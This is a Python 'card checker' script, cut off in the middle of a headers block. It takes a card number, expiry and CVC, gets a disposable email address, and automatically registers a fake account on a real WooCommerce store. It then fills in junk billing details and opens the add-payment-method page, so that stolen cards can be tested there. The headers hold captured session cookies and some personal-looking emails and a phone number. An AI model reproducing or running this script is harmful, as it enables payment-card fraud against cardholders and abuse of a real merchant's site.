def chk(card):
	
	import requests, re, base64, random, string, user_agent, time
	from requests_toolbelt.multipart.encoder import MultipartEncoder
	
	from requests.packages.urllib3.exceptions import InsecureRequestWarning
	
	requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
	
	card = card.strip()
	parts = re.split('[|/:]', card)
	n = parts[0]
	mm = parts[1]
	yy = parts[2]
	cvc = parts[3]

	if "20" in yy:
		yy = yy.split("20")[1]
	
	
	r = requests.session()
	user = user_agent.generate_user_agent()
	









	headers = {
	    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
	}
	
	response = requests.get('https://temp-mail.random-gen.com/', headers=headers)	
	
	acc = re.search(r'&quot;params&quot;:\[&quot;(.*?)&quot;\]', response.text).group(1)
#1


	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22}; PHPSESSID=7edce710572f61709a2d78e21bebb3ae; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; _sp_ses.8d3e=*; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; wordpress_test_cookie=WP%20Cookie%20check; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2F; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; last_pys_landing_page=https://atrantil.com/my-account/; _ga_N0D7FWVJF6=GS1.1.1724976959.4.1.1724976967.52.0.1477525012; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; _sp_id.8d3e=cf908450f56797e2.1724093245.4.1724976977.1724266916',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/add-payment-method/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = r.get('https://atrantil.com/my-account/',headers=headers)

	regis = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)

#2


	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; PHPSESSID=7edce710572f61709a2d78e21bebb3ae; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; _sp_ses.8d3e=*; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; wordpress_test_cookie=WP%20Cookie%20check; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; last_pys_landing_page=https://atrantil.com/my-account/; sbjs_session=pgs%3D3%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2F; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; _sp_id.8d3e=cf908450f56797e2.1724093245.4.1724977028.1724266916; wickedEmails2280617085=yuihghhg%40gmail.com; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22%2C%22emails%22:[%22yuihghhg@gmail.com%22]}; _ga_N0D7FWVJF6=GS1.1.1724976959.4.1.1724977187.60.0.1477525012',
    'origin': 'https://atrantil.com',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'email': acc,
    'wc_order_attribution_source_type': 'typein',
    'wc_order_attribution_referrer': '(none)',
    'wc_order_attribution_utm_campaign': '(none)',
    'wc_order_attribution_utm_source': '(direct)',
    'wc_order_attribution_utm_medium': '(none)',
    'wc_order_attribution_utm_content': '(none)',
    'wc_order_attribution_utm_id': '(none)',
    'wc_order_attribution_utm_term': '(none)',
    'wc_order_attribution_utm_source_platform': '(none)',
    'wc_order_attribution_utm_creative_format': '(none)',
    'wc_order_attribution_utm_marketing_tactic': '(none)',
    'wc_order_attribution_session_entry': 'https://atrantil.com/my-account/add-payment-method/',
    'wc_order_attribution_session_start_time': '2024-08-30 00:15:57',
    'wc_order_attribution_session_pages': '3',
    'wc_order_attribution_session_count': '1',
    'wc_order_attribution_user_agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    'woocommerce-register-nonce': regis,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
}

	response = r.post('https://atrantil.com/my-account/',headers=headers,data=data)


#3

	
	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; PHPSESSID=7edce710572f61709a2d78e21bebb3ae; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; _sp_ses.8d3e=*; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; wordpress_test_cookie=WP%20Cookie%20check; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; last_pys_landing_page=https://atrantil.com/my-account/; wickedEmails2280617085=yuihghhg%40gmail.com; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22%2C%22emails%22:[%22yuihghhg@gmail.com%22]}; wordpress_logged_in_609f678b007c0edeaa61db1e62c0384e=yuihghhg%7C1726186792%7CDQmhYIds6EGMcZjLwcMMODjChuIysjLmCdZMuxWqJQk%7C6780c210994e703d0482fde5c35f8586ec92d96227ae56e7f91f15d2a9ae5e91; wfwaf-authcookie-65d930f6b4b52d59823a65dc658b1ad9=27878%7Cother%7Cread%7C0de9f75b02bc79a1f87747b15e043db939037c85cad7c7a7c8dbea5928941093; sbjs_session=pgs%3D6%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fedit-address%2Fbilling%2F; _ga_N0D7FWVJF6=GS1.1.1724976959.4.1.1724977419.12.1.1477525012; ss_enduser_cookie|67ef42d89a=01c26f0d-d95a-47bb-b00d-4b9a5d3b2dae; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; wickedEmails681966737=yuihghhg%40gmail.com; _sp_id.8d3e=cf908450f56797e2.1724093245.4.1724977439.1724266916',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/edit-address/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://atrantil.com/my-account/edit-address/billing/', cookies=r.cookies,headers=headers)

	address = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', response.text).group(1)



#4

	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    'content-type': 'application/x-www-form-urlencoded',
    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; PHPSESSID=7edce710572f61709a2d78e21bebb3ae; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; _sp_ses.8d3e=*; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; wordpress_test_cookie=WP%20Cookie%20check; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; last_pys_landing_page=https://atrantil.com/my-account/; wickedEmails2280617085=yuihghhg%40gmail.com; wordpress_logged_in_609f678b007c0edeaa61db1e62c0384e=yuihghhg%7C1726186792%7CDQmhYIds6EGMcZjLwcMMODjChuIysjLmCdZMuxWqJQk%7C6780c210994e703d0482fde5c35f8586ec92d96227ae56e7f91f15d2a9ae5e91; wfwaf-authcookie-65d930f6b4b52d59823a65dc658b1ad9=27878%7Cother%7Cread%7C0de9f75b02bc79a1f87747b15e043db939037c85cad7c7a7c8dbea5928941093; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fedit-address%2Fbilling%2F; ss_enduser_cookie|67ef42d89a=996d6e36-fbc7-4dda-bfba-3c7345d72590; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; wickedEmails681966737=yuihghhg%40gmail.com%2Cmoh5527vbnm%40gmail.com; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22%2C%22emails%22:[%22yuihghhg@gmail.com%22%2C%22moh5527vbnm@gmail.com%22]%2C%22phones%22:[%222153652415%22]}; _sp_id.8d3e=cf908450f56797e2.1724093245.4.1724977650.1724266916; _ga_N0D7FWVJF6=GS1.1.1724976959.4.1.1724977651.57.1.1477525012',
    'origin': 'https://atrantil.com',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/edit-address/billing/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	data = {
    'billing_first_name': 'bbxbcbb',
    'billing_last_name': 'hhxbfbb',
    'billing_company': '',
    'billing_country': 'US',
    'billing_address_1': 'hhfhfbfv',
    'billing_address_2': 'hbdbfv',
    'billing_city': 'hfhdvvxv',
    'billing_state': 'NY',
    'billing_postcode': '10080',
    'billing_phone': '2153652415',
    'billing_email': 'moh5527vbnm@gmail.com',
    'save_address': 'Save address',
    'woocommerce-edit-address-nonce':address,
    '_wp_http_referer': '/my-account/edit-address/billing/',
    'action': 'edit_address',
}

	response = requests.post('https://atrantil.com/my-account/edit-address/billing/', cookies=r.cookies,headers=headers, data=data)
#5

	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
    # 'cookie': '_gcl_au=1.1.434984831.1724093246; _ga=GA1.1.210261757.1724093246; _pin_unauth=dWlkPVlqUmpNalExWmpjdE5HTTRNQzAwWXpreExXRmtOelV0TURSbU5qVXlaV0ZsT1dZMA; cookieyes-consent=consentid:ZjQxejdkaFU0Q3pNMHpkZFJGUndpZ0ZYYng3REwxMmk,consent:yes,action:no,necessary:yes,functional:yes,analytics:yes,performance:yes,advertisement:yes,other:yes; _fbp=fb.1.1724093250124.81672869775922913; _derived_epik=dj0yJnU9enNQang1aWhSWFJjZnR3ZzFJcGdUbnNxRmNWbEk3bWImbj1UVk9wZGZ4TmRZTDYyUEtESEQ3THdBJm09NCZ0PUFBQUFBR2JGSUxnJnJtPTQmcnQ9QUFBQUFHYkZJTGcmc3A9Mg; ct_sfw_pass_key=9b8cfc83a132648e3968735bfd19567a0; PHPSESSID=7edce710572f61709a2d78e21bebb3ae; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-08-30%2000%3A15%3A57%7C%7C%7Cep%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; yotpo_pixel=b96a9e1b-e817-4c65-a3a2-60ebfd08d68e; _sp_ses.8d3e=*; wickedfu_null=%7B%22url%22%3A%22https%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F%3Futm_source%3DDirect%26utm_medium%3DDirect%26utm_campaign%3DDirect%26utm_content%3Datrantil.com%252Fmy-account%252Fadd-payment-method%26utm_term%3DOrganic%2520traffic%22%2C%22referrer%22%3A%22%22%2C%22time%22%3A1724976961119%2C%22c%22%3A4723%7D; wordpress_test_cookie=WP%20Cookie%20check; pys_session_limit=true; pys_start_session=true; pys_first_visit=true; pysTrafficSource=direct; pys_landing_page=https://atrantil.com/my-account/; last_pysTrafficSource=direct; last_pys_landing_page=https://atrantil.com/my-account/; wickedEmails2280617085=yuihghhg%40gmail.com; wordpress_logged_in_609f678b007c0edeaa61db1e62c0384e=yuihghhg%7C1726186792%7CDQmhYIds6EGMcZjLwcMMODjChuIysjLmCdZMuxWqJQk%7C6780c210994e703d0482fde5c35f8586ec92d96227ae56e7f91f15d2a9ae5e91; wfwaf-authcookie-65d930f6b4b52d59823a65dc658b1ad9=27878%7Cother%7Cread%7C0de9f75b02bc79a1f87747b15e043db939037c85cad7c7a7c8dbea5928941093; wickedEmails681966737=yuihghhg%40gmail.com%2Cmoh5527vbnm%40gmail.com; pys_advanced_form_data={%22first_name%22:%22%22%2C%22last_name%22:%22%22%2C%22email%22:%22rgrgrgrgrgrgrggr@gmail.com%22%2C%22phone%22:%222153652415%22%2C%22emails%22:[%22yuihghhg@gmail.com%22%2C%22moh5527vbnm@gmail.com%22]%2C%22phones%22:[%222153652415%22]}; _ga_N0D7FWVJF6=GS1.1.1724976959.4.1.1724977861.49.1.1477525012; ss_enduser_cookie|67ef42d89a=8ca1768b-9882-4597-acb9-b10411bac100; sbjs_session=pgs%3D10%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fatrantil.com%2Fmy-account%2Fadd-payment-method%2F; _uetsid=09b96dc0666511ef8a0dc3ccbc0fc1e8; _uetvid=83e094e05e5b11ef9a5de103894ef53f; _sp_id.8d3e=cf908450f56797e2.1724093245.4.1724977893.1724266916',
    'pragma': 'no-cache',
    'referer': 'https://atrantil.com/my-account/payment-methods/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}

	response = requests.get('https://atrantil.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)


#$$$




	headers = {
    'authority': 'atrantil.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'no-cache',
